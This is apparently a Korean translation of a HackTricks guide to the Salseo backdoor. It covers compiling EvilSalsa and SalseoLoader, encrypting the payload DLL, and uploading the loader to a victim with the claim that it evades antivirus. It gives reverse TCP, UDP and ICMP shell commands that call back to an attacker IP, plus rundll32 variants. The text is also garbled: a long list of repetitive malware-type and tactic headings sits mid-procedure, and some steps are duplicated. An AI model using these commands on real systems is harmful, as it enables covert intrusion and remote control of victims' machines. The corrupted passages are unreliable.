# Salseo

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 이진 파일 컴파일하기

깃허브에서 소스 코드를 다운로드하고 **EvilSalsa**와 **SalseoLoader**를 컴파일하세요. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.

이 프로젝트를 Windows 상자에서 사용할 아키텍처에 맞게 컴파일하세요(Windows가 x64를 지원하는 경우 해당 아키텍처로 컴파일하세요).

Visual Studio에서 **왼쪽 "Build" 탭**의 **"Platform Target"**에서 아키텍처를 **선택**할 수 있습니다.

(\*\*이 옵션을 찾을 수 없는 경우 **"Project Tab"**에서 **"\<Project Name> Properties"**로 이동하세요)

![](<../.gitbook/assets/image (132).png>)

그런 다음, 두 프로젝트를 빌드하세요 (Build -> Build Solution) (로그에 실행 파일의 경로가 표시됩니다):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 백도어 준비하기

먼저, **EvilSalsa.dll**을 인코딩해야 합니다. 이를 위해 python 스크립트 **encrypterassembly.py**를 사용하거나 프로젝트 **EncrypterAssembly**를 컴파일할 수 있습니다:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo

##### Salseo - Backdoor

###### Salseo - Backdoor - Persistence

###### Salseo - Backdoor - Privilege Escalation

###### Salseo - Backdoor - Lateral Movement

###### Salseo - Backdoor - Exfiltration

###### Salseo - Backdoor - Defense Evasion

###### Salseo - Backdoor - Credential Access

###### Salseo - Backdoor - Discovery

###### Salseo - Backdoor - Collection

###### Salseo - Backdoor - Command and Control

###### Salseo - Backdoor - Execution

###### Salseo - Backdoor - Impact

##### Salseo - RAT

###### Salseo - RAT - Persistence

###### Salseo - RAT - Privilege Escalation

###### Salseo - RAT - Lateral Movement

###### Salseo - RAT - Exfiltration

###### Salseo - RAT - Defense Evasion

###### Salseo - RAT - Credential Access

###### Salseo - RAT - Discovery

###### Salseo - RAT - Collection

###### Salseo - RAT - Command and Control

###### Salseo - RAT - Execution

###### Salseo - RAT - Impact

##### Salseo - Web Shell

###### Salseo - Web Shell - Persistence

###### Salseo - Web Shell - Privilege Escalation

###### Salseo - Web Shell - Lateral Movement

###### Salseo - Web Shell - Exfiltration

###### Salseo - Web Shell - Defense Evasion

###### Salseo - Web Shell - Credential Access

###### Salseo - Web Shell - Discovery

###### Salseo - Web Shell - Collection

###### Salseo - Web Shell - Command and Control

###### Salseo - Web Shell - Execution

###### Salseo - Web Shell - Impact

##### Salseo - Trojan

###### Salseo - Trojan - Persistence

###### Salseo - Trojan - Privilege Escalation

###### Salseo - Trojan - Lateral Movement

###### Salseo - Trojan - Exfiltration

###### Salseo - Trojan - Defense Evasion

###### Salseo - Trojan - Credential Access

###### Salseo - Trojan - Discovery

###### Salseo - Trojan - Collection

###### Salseo - Trojan - Command and Control

###### Salseo - Trojan - Execution

###### Salseo - Trojan - Impact

##### Salseo - Keylogger

###### Salseo - Keylogger - Persistence

###### Salseo - Keylogger - Privilege Escalation

###### Salseo - Keylogger - Lateral Movement

###### Salseo - Keylogger - Exfiltration

###### Salseo - Keylogger - Defense Evasion

###### Salseo - Keylogger - Credential Access

###### Salseo - Keylogger - Discovery

###### Salseo - Keylogger - Collection

###### Salseo - Keylogger - Command and Control

###### Salseo - Keylogger - Execution

###### Salseo - Keylogger - Impact

##### Salseo - Ransomware

###### Salseo - Ransomware - Persistence

###### Salseo - Ransomware - Privilege Escalation

###### Salseo - Ransomware - Lateral Movement

###### Salseo - Ransomware - Exfiltration

###### Salseo - Ransomware - Defense Evasion

###### Salseo - Ransomware - Credential Access

###### Salseo - Ransomware - Discovery

###### Salseo - Ransomware - Collection

###### Salseo - Ransomware - Command and Control

###### Salseo - Ransomware - Execution

###### Salseo - Ransomware - Impact

##### Salseo - Rootkit

###### Salseo - Rootkit - Persistence

###### Salseo - Rootkit - Privilege Escalation

###### Salseo - Rootkit - Lateral Movement

###### Salseo - Rootkit - Exfiltration

###### Salseo - Rootkit - Defense Evasion

###### Salseo - Rootkit - Credential Access

###### Salseo - Rootkit - Discovery

###### Salseo - Rootkit - Collection

###### Salseo - Rootkit - Command and Control

###### Salseo - Rootkit - Execution

###### Salseo - Rootkit - Impact

##### Salseo - Botnet

###### Salseo - Botnet - Persistence

###### Salseo - Botnet - Privilege Escalation

###### Salseo - Botnet - Lateral Movement

###### Salseo - Botnet - Exfiltration

###### Salseo - Botnet - Defense Evasion

###### Salseo - Botnet - Credential Access

###### Salseo - Botnet - Discovery

###### Salseo - Botnet - Collection

###### Salseo - Botnet - Command and Control

###### Salseo - Botnet - Execution

###### Salseo - Botnet - Impact
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
좋아요, 이제 Salseo 작업을 실행하기 위해 필요한 모든 것을 갖고 있습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 이진 파일**입니다.

**SalseoLoader.exe 이진 파일을 기기에 업로드하세요. 어떤 AV에서도 감지되지 않아야 합니다...**

## **백도어 실행하기**

### **TCP 역쉘 얻기 (HTTP를 통해 인코딩된 dll 다운로드)**

역쉘 리스너로 nc를 시작하고, 인코딩된 evilsalsa를 제공하기 위해 HTTP 서버를 실행하는 것을 잊지 마세요.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP 역쉘 획득하기 (SMB를 통해 인코딩된 dll 다운로드)**

역쉘 리스너로 nc를 시작하고, 인코딩된 evilsalsa를 제공하기 위해 SMB 서버를 시작하는 것을 기억하세요 (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP 역쉘 획득 (피해자 내부에 이미 인코딩된 dll이 있는 경우)**

**이번에는 역쉘을 수신하기 위해 클라이언트에 특수 도구가 필요합니다. 다음을 다운로드하세요:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP 응답 비활성화:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 클라이언트 실행하기:

```bash
python3 client.py
```

#### Execute the server:

```bash
python3 server.py
```

#### 클라이언트 실행하기:

```bash
python3 client.py
```

#### 서버 실행하기:

```bash
python3 server.py
```
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 피해자 내부에서, salseo 작업을 실행합니다:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## DLL로 메인 함수를 내보내는 SalseoLoader 컴파일하기

Visual Studio를 사용하여 SalseoLoader 프로젝트를 엽니다.

### 메인 함수 앞에 \[DllExport] 추가하기

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 이 프로젝트에 DllExport 설치하기

#### **도구** --> **NuGet 패키지 관리자** --> **솔루션용 NuGet 패키지 관리...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport 패키지를 검색하고 설치 버튼을 누릅니다 (팝업을 허용합니다)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

프로젝트 폴더에 **DllExport.bat**과 **DllExport\_Configure.bat** 파일이 나타납니다.

### DllExport 제거하기

**제거** 버튼을 누릅니다 (네, 이상하지만 믿어주세요, 필요합니다)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio를 종료하고 DllExport\_configure 실행하기

Visual Studio를 **종료**합니다.

그런 다음, **SalseoLoader 폴더**로 이동하여 **DllExport\_Configure.bat**을 실행합니다.

**x64**를 선택합니다 (x64 상자 내에서 사용할 것이라면, 제 경우에는 그랬습니다), **System.Runtime.InteropServices**를 선택합니다 (DllExport의 네임스페이스 내에서) 그리고 **적용**을 누릅니다.

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### Visual Studio로 프로젝트 다시 열기

**\[DllExport]**는 더 이상 오류로 표시되지 않아야 합니다.

![](<../.gitbook/assets/image (8) (1).png>)

### 솔루션 빌드하기

**출력 유형 = 클래스 라이브러리**를 선택합니다 (프로젝트 --> SalseoLoader 속성 --> 응용 프로그램 --> 출력 유형 = 클래스 라이브러리)

![](<../.gitbook/assets/image (10) (1).png>)

**x64 플랫폼**을 선택합니다 (프로젝트 --> SalseoLoader 속성 --> 빌드 --> 플랫폼 대상 = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

솔루션을 **빌드**하기 위해: 빌드 --> 솔루션 빌드 (출력 콘솔에 새 DLL의 경로가 표시됩니다)

### 생성된 Dll 테스트하기

테스트하려는 위치에 Dll을 복사하여 붙여넣습니다.

다음을 실행합니다:
```
rundll32.exe SalseoLoader.dll,main
```
만약 오류가 나타나지 않는다면, 아마도 기능적인 DLL이 있을 것입니다!!

## DLL을 사용하여 셸 획득

**HTTP** **서버**를 사용하고 **nc** **리스너**를 설정하는 것을 잊지 마세요.

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD는 Windows 운영 체제에서 사용되는 명령 줄 인터페이스(Command Line Interface)입니다. CMD를 사용하면 사용자는 컴퓨터에 대한 다양한 작업을 수행할 수 있습니다. CMD를 통해 파일 및 폴더 관리, 시스템 설정 변경, 네트워크 관리 등을 할 수 있습니다. 또한 CMD를 사용하여 프로그램을 실행하고, 프로세스를 관리하고, 시스템 정보를 확인할 수도 있습니다.

CMD는 강력한 도구이며, 해커들은 이를 악용하여 시스템에 대한 액세스 권한을 얻거나, 악성 코드를 실행하거나, 시스템을 손상시킬 수 있습니다. 따라서 시스템 보안을 강화하기 위해서는 CMD의 사용을 제한하거나 적절한 보안 조치를 취해야 합니다.

CMD를 사용하여 백도어를 설치하거나 관리하는 것도 가능합니다. 백도어는 해커가 시스템에 액세스할 수 있는 비밀 경로를 만드는 도구입니다. 백도어를 설치하면 해커는 시스템에 대한 완전한 제어권을 획득할 수 있으며, 이는 불법적인 활동에 이용될 수 있습니다. 따라서 시스템 보안을 유지하기 위해서는 백도어를 탐지하고 제거하는 방법을 알아야 합니다.

CMD를 사용하는 것은 유용하지만, 주의해야 할 점도 있습니다. CMD를 사용할 때는 신중하게 사용하고, 보안 조치를 취하여 시스템을 안전하게 유지해야 합니다.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
